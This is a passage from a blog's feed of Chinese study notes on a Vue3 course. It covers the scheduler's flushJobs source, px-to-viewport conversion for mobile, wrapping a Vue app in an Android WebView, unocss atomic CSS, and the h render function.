&#123;</span><br><span class="line">  isFlushPending = <span class="literal">false</span></span><br><span class="line">  isFlushing = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    seen = seen || <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sort queue before flush.</span></span><br><span class="line">  <span class="comment">// This ensures that:</span></span><br><span class="line">  <span class="comment">// 1. Components are updated from parent to child. (because parent is always</span></span><br><span class="line">  <span class="comment">//    created before the child so its render effect will have smaller</span></span><br><span class="line">  <span class="comment">//    priority number)</span></span><br><span class="line">  <span class="comment">// 2. If a component is unmounted during a parent component&#x27;s update,</span></span><br><span class="line">  <span class="comment">//    its update can be skipped.</span></span><br><span class="line">  <span class="comment">// 给队列进行排序</span></span><br><span class="line">  queue.<span class="title function_">sort</span>(comparator)</span><br><span class="line">  <span class="comment">// 更新前确保队列是正确的</span></span><br><span class="line">  <span class="comment">// 先创建父组件再创建子组件</span></span><br><span class="line">  <span class="comment">// 如果父组件更新时子组件被卸载了，那么子组件的更新可以被跳过</span></span><br><span class="line">  <span class="comment">// conditional usage of checkRecursiveUpdate must be determined out of</span></span><br><span class="line">  <span class="comment">// try ... catch block since Rollup by default de-optimizes treeshaking</span></span><br><span class="line">  <span class="comment">// inside try-catch. This can leave all warning code unshaked. Although</span></span><br><span class="line">  <span class="comment">// they would get eventually shaken by a minifier like terser, some minifiers</span></span><br><span class="line">  <span class="comment">// would fail to do that (e.g. https://github.com/evanw/esbuild/issues/1610)</span></span><br><span class="line">  <span class="keyword">const</span> check = __DEV__</span><br><span class="line">    ? <span class="function">(<span class="params">job: SchedulerJob</span>) =&gt;</span> <span class="title function_">checkRecursiveUpdates</span>(seen!, job)</span><br><span class="line">    : <span class="variable constant_">NOOP</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历queue队列批量执行</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (flushIndex = <span class="number">0</span>; flushIndex &lt; queue.<span class="property">length</span>; flushIndex++) &#123;</span><br><span class="line">      <span class="keyword">const</span> job = queue[flushIndex]</span><br><span class="line">      <span class="keyword">if</span> (job &amp;&amp; job.<span class="property">active</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__ &amp;&amp; <span class="title function_">check</span>(job)) &#123;</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// console.log(`running:`, job.id)</span></span><br><span class="line">        <span class="comment">// 执行job函数</span></span><br><span class="line">        <span class="title function_">callWithErrorHandling</span>(job, <span class="literal">null</span>, <span class="title class_">ErrorCodes</span>.<span class="property">SCHEDULER</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 执行完成 重置状态</span></span><br><span class="line">    flushIndex = <span class="number">0</span></span><br><span class="line">    queue.<span class="property">length</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行不同的调度策略</span></span><br><span class="line">    <span class="title function_">flushPostFlushCbs</span>(seen)</span><br><span class="line"></span><br><span class="line">    isFlushing = <span class="literal">false</span></span><br><span class="line">    currentFlushPromise = <span class="literal">null</span></span><br><span class="line">    <span class="comment">// some postFlushCb queued jobs!</span></span><br><span class="line">    <span class="comment">// keep flushing until it drains.</span></span><br><span class="line">    <span class="keyword">if</span> (queue.<span class="property">length</span> || pendingPostFlushCbs.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="title function_">flushJobs</span>(seen)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>JavaScript</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue开发移动端</title>
    <url>/web/study/Vue/36.Vue%E5%BC%80%E5%8F%91%E7%A7%BB%E5%8A%A8%E7%AB%AF.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="移动端尺寸"><a href="#移动端尺寸" class="headerlink" title="移动端尺寸"></a>移动端尺寸</h1><p>开发移动端最重要的是适配各种手机，所以应该使用相对尺寸单位，比如根据HTML font-size做缩放的rem，或与视口高度&#x2F;宽度有关的vw&#x2F;vh。</p>
<p>但前端设计稿通常采用px设计，为了适应多尺寸，需要对单位做转化。</p>
<p>可以使用插件postcss-px-to-viewport将px转化为vw&#x2F;vh。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm install postcss-px-to-viewport -d</span><br></pre></td></tr></table></figure>

<p>配置（vite.config.js）：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">css</span>: &#123;</span><br><span class="line">    <span class="attr">postcss</span>: &#123;</span><br><span class="line">      <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="title function_">pxtoViewPort</span>(&#123;</span><br><span class="line">          <span class="attr">unitToConvert</span>: <span class="string">&#x27;px&#x27;</span>, <span class="comment">// 要转化的单位</span></span><br><span class="line">          <span class="attr">viewportWidth</span>: <span class="number">320</span>, <span class="comment">// UI设计稿的宽度</span></span><br><span class="line">          <span class="comment">// unitPrecision: 6, // 转换后的精度，即小数点位数</span></span><br><span class="line">          <span class="comment">// propList: [&#x27;*&#x27;], // 指定转换的css属性的单位，*代表全部css属性的单位都进行转换</span></span><br><span class="line">          <span class="comment">// viewportUnit: &#x27;vw&#x27;, // 指定需要转换成的视窗单位，默认vw</span></span><br><span class="line">          <span class="comment">// fontViewportUnit: &#x27;vw&#x27;, // 指定字体需要转换成的视窗单位，默认vw</span></span><br><span class="line">          <span class="comment">// selectorBlackList: [&#x27;ignore-&#x27;], // 指定不转换为视窗单位的类名，</span></span><br><span class="line">          <span class="comment">// minPixelValue: 1, // 默认值1，小于或等于1px则不进行转换</span></span><br><span class="line">          <span class="comment">// mediaQuery: true, // 是否在媒体查询的css代码中也进行转换，默认false</span></span><br><span class="line">          <span class="comment">// replace: true, // 是否转换后直接更换属性值</span></span><br><span class="line">          <span class="comment">// landscape: false // 是否处理横屏情况</span></span><br><span class="line">        &#125;)</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试（App.vue）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;test&quot;&gt;</span><br><span class="line">    草</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.test &#123;</span><br><span class="line">  // 这里写的是px</span><br><span class="line">  width: 200px;</span><br><span class="line">  background-color: pink;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306021551654.png" alt="但是被变成vw啦"></p>
<p>可以看到px单位被转化成了vw</p>
<h1 id="打包成安卓应用"><a href="#打包成安卓应用" class="headerlink" title="打包成安卓应用"></a>打包成安卓应用</h1><ol>
<li><p>新建一个Android Studio项目</p>
</li>
<li><p>将res&#x2F;layout&#x2F;activity_main.xml代码修改成：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span>  <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/activity_main&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/web_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将程序包的MainActivity.java代码修改成：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vuetest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebViewClient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取id为web_view的WebView XML标签</span></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">view</span> <span class="operator">=</span> findViewById(R.id.web_view);</span><br><span class="line">        <span class="comment">// 运行执行JavaScript脚本</span></span><br><span class="line">        view.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// Vue项目的服务器地址</span></span><br><span class="line">        view.loadUrl(<span class="string">&quot;http://10.0.2.2:5173&quot;</span>);</span><br><span class="line">        view.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将manifests&#x2F;AndroidManifest.xml代码修改成：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.vuetest&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.VueTest&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>CSS</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>unocss原子化</title>
    <url>/web/study/Vue/37.unocss%E5%8E%9F%E5%AD%90%E5%8C%96.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="CSS原子化"><a href="#CSS原子化" class="headerlink" title="CSS原子化"></a>CSS原子化</h1><p><a href="https://zhuanlan.zhihu.com/p/425814828">Anthony Fu - 重新构想原子化CSS</a></p>
<p>原子化CSS是一种CSS的架构方式，它倾向于小巧且用途单一的class，并且会以视觉效果进行命名，例如：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.m-0</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.text-red</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<p>优点：</p>
<ol>
<li>减少CSS体积、提高CSA复用</li>
<li>减少起名复杂度</li>
</ol>
<p>缺点：增加记忆成本，因为将CSS拆分成原子后，必须记住一些class才能书写</p>
<h1 id="项目接入unocss"><a href="#项目接入unocss" class="headerlink" title="项目接入unocss"></a>项目接入unocss</h1><p>引入依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i -D unocss</span><br></pre></td></tr></table></figure>

<p>配置（vite.config.ts）：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unocss <span class="keyword">from</span> <span class="string">&#x27;unocss/vite&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line"><span class="comment">// 省略...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">plugins</span>: [<span class="title function_">unocss</span>(&#123;</span><br><span class="line">  <span class="attr">rules</span>:[</span><br><span class="line">    <span class="comment">// 静态类名</span></span><br><span class="line">    [<span class="string">&quot;flex&quot;</span>,&#123;<span class="attr">display</span>:<span class="string">&quot;flex&quot;</span>&#125;],</span><br><span class="line">    [<span class="string">&quot;red&quot;</span>,&#123;<span class="attr">color</span>:<span class="string">&quot;red&quot;</span>&#125;],</span><br><span class="line">    <span class="comment">// 动态类名</span></span><br><span class="line">    [<span class="regexp">/^m-(\d+)$/</span>, <span class="function">(<span class="params">[,d]</span>)=&gt;</span>(&#123;<span class="attr">margin</span>:<span class="string">`<span class="subst">$&#123;<span class="built_in">Number</span>(d)*<span class="number">10</span>&#125;</span>px`</span>&#125;)]</span><br><span class="line">    <span class="comment">// 省略......</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">shortcuts</span>: &#123;</span><br><span class="line">    <span class="comment">// 组合类名</span></span><br><span class="line">    <span class="attr">karate</span>: [<span class="string">&quot;flex&quot;</span>,<span class="string">&quot;red&quot;</span>]</span><br><span class="line">  &#125;&#125;)],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>引入（main.ts）：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;uno.css&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="使用unocss"><a href="#使用unocss" class="headerlink" title="使用unocss"></a>使用unocss</h1><h2 id="常规使用"><a href="#常规使用" class="headerlink" title="常规使用"></a>常规使用</h2><p>vite.config.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">unocss</span>(&#123;</span><br><span class="line">  <span class="attr">rules</span>:[</span><br><span class="line">    <span class="comment">// 静态类名</span></span><br><span class="line">    [<span class="string">&quot;flex&quot;</span>,&#123;<span class="attr">display</span>:<span class="string">&quot;flex&quot;</span>&#125;],</span><br><span class="line">    [<span class="string">&quot;red&quot;</span>,&#123;<span class="attr">color</span>:<span class="string">&quot;red&quot;</span>&#125;],</span><br><span class="line">    <span class="comment">// 动态类名</span></span><br><span class="line">    [<span class="regexp">/^m-(\d+)$/</span>, <span class="function">(<span class="params">[,d]</span>)=&gt;</span>(&#123;<span class="attr">margin</span>:<span class="string">`<span class="subst">$&#123;<span class="built_in">Number</span>(d)*<span class="number">10</span>&#125;</span>px`</span>&#125;)]</span><br><span class="line">    <span class="comment">// 省略......</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">shortcuts</span>: &#123;</span><br><span class="line">    <span class="comment">// 组合类名</span></span><br><span class="line">    <span class="attr">karate</span>: [<span class="string">&quot;flex&quot;</span>,<span class="string">&quot;red&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 使用静态类名 --&gt;</span><br><span class="line">    &lt;!-- &lt;div class=&quot;flex red&quot;&gt; --&gt;</span><br><span class="line">    &lt;!-- 使用组合类名 --&gt;</span><br><span class="line">    &lt;div class=&quot;karate&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;m-2&quot;&gt;yjsp&amp;nbsp;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;m-4&quot;&gt;mur&amp;nbsp;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;m-6&quot;&gt;kmr&amp;nbsp;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>样式便成功地被应用了。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306031738817.png"></p>
<h2 id="使用预设"><a href="#使用预设" class="headerlink" title="使用预设"></a>使用预设</h2><ul>
<li>presetIcons：根据类名使用图标库<a href="https://icones.js.org/">Icônes</a></li>
<li>presetAttributify：美化属性</li>
<li>presetUno：预设类名</li>
</ul>
<p>vite.config.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; presetIcons, presetAttributify, presetUno &#125; <span class="keyword">from</span> <span class="string">&#x27;unocss&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 其他省略......</span></span><br><span class="line">  <span class="attr">plugins</span>: [<span class="title function_">unoCss</span>(&#123;</span><br><span class="line">    <span class="attr">presets</span>: [<span class="title function_">presetIcons</span>(),<span class="title function_">presetAttributify</span>(),<span class="title function_">presetUno</span>()]</span><br><span class="line">  &#125;)]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 使用presetIcons --&gt;</span><br><span class="line">    &lt;div class=&quot;i-ic-baseline-access-alarm&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;!-- 使用presetAttributify --&gt;</span><br><span class="line">    &lt;div flex red m=&quot;1&quot;&gt;yajue&lt;/div&gt;</span><br><span class="line">    &lt;!-- 使用presetUno --&gt;</span><br><span class="line">    &lt;div class=&quot;bg-red-300&quot;&gt;草&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>预设的样式生效了。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306031800703.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>CSS</tag>
        <tag>unocss</tag>
      </tags>
  </entry>
  <entry>
    <title>函数式编程h函数</title>
    <url>/web/study/Vue/38.%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8Bh%E5%87%BD%E6%95%B0.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h1><p>主要用到h函数，h接收三个参数</p>
<ul>
<li>type：元素的类型</li>
<li>propsOrChildren：数据对象，主要表示props、attrs、dom props、class和style</li>
<li>children：子节点</li>
</ul>
<p>优点：跳过了模板的编译过程</p>
<p>缺点：很难看，学习成本高</p>
<blockquote>
<p>模板的编译过程：</p>
<ol>
<li>parser函数将模板转成抽象语法树ast</li>
<li>transform函数将ast转成js api</li>
<li>generate函数通过js api生成render函数</li>
</ol>
<p>render函数会返回一个形如这样的数据，就是h函数：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_">h</span>(<span class="string">&quot;div&quot;</span>,&#123;&#125;,[</span><br><span class="line">  <span class="title function_">h</span>(<span class="string">&quot;span&quot;</span>,&#123;&#125;,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>Vue3开发使用h函数较少，因为Vue3模板的编译性能也不差。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;table border&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;th&gt;name&lt;/th&gt;</span><br><span class="line">      &lt;th&gt;age&lt;/th&gt;</span><br><span class="line">      &lt;th&gt;address&lt;/th&gt;</span><br><span class="line">      &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; item.name &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; item.age &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; item.address &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;</span><br><span class="line">        &lt;Btn type=&quot;success&quot;&gt;编辑&lt;/Btn&gt;</span><br><span class="line">        &lt;Btn type=&quot;error&quot;&gt;删除&lt;/Btn&gt;</span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; h, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const list = reactive([</span><br><span class="line">  &#123;id:20,name:&quot;yajue&quot;,age:20,address:&quot;xbz&quot;&#125;,</span><br><span class="line">  &#123;id:21,name:&quot;yajue&quot;,age:21,address:&quot;xbz&quot;&#125;,</span><br><span class="line">  &#123;id:22,name:&quot;yajue&quot;,age:22,address:&quot;xbz&quot;&#125;,</span><br><span class="line">  &#123;id:23,name:&quot;yajue&quot;,age:23,address:&quot;xbz&quot;&#125;,</span><br><span class="line">  &#123;id:24,name:&quot;yajue&quot;,age:24,address:&quot;xbz&quot;&#125;,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">interface Props &#123;</span><br><span class="line">  type: &quot;success&quot; | &quot;error&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 类似setup函数模式</span><br><span class="line">// 可以用于封装一些小组件</span><br><span class="line">const Btn = (props:Props,ctx:any,)=&gt; &#123;</span><br><span class="line">  // 参数1：节点名   参数2：节点属性   参数3：节点内容</span><br><span class="line">  return h(&quot;button&quot;,&#123;</span><br><span class="line">    class:&quot;btn&quot;,</span><br><span class="line">    style: &#123;</span><br><span class="line">      color: props.type===&quot;success&quot;?&quot;green&quot;:&quot;red&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    onClick:()=&gt;&#123;</span><br><span class="line">      if(props.type===&quot;success&quot;) &#123;</span><br><span class="line">        console.log(&quot;编辑&quot;)</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        console.log(&quot;删除&quot;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,ctx.slots.default())</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-core/src/h.ts</code>）中可以看到h函数的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Actual implementation</span></span><br><span class="line"><span class="comment">// 根据h函数的参数创建虚拟节点</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">h</span>(<span class="params"><span class="keyword">type</span>: <span class="built_in">any</span>, propsOrChildren?: <span class="built_in">any</span>, children?: <span class="built_in">any</span></span>): <span class="title class_">VNode</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> l = <span class="variable language_">arguments</span>.<span class="property">length</span></span><br><span class="line">  <span class="keyword">if</span> (l === <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(propsOrChildren) &amp;&amp; !<span class="title function_">isArray</span>(propsOrChildren)) &#123;</span><br><span class="line">      <span class="comment">// single vnode without props</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">isVNode</span>(propsOrChildren)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">createVNode</span>(<span class="keyword">type</span>, <span class="literal">null</span>, [propsOrChildren])</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// props without children</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">createVNode</span>(<span class="keyword">type</span>, propsOrChildren)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// omit props</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">createVNode</span>(<span class="keyword">type</span>, <span class="literal">null</span>, propsOrChildren)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt; <span class="number">3</span>) &#123;</span><br><span class="line">      children = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">2</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l === <span class="number">3</span> &amp;&amp; <span class="title function_">isVNode</span>(children)) &#123;</span><br><span class="line">      children = [children]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">createVNode</span>(<span class="keyword">type</span>, propsOrChildren, children)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
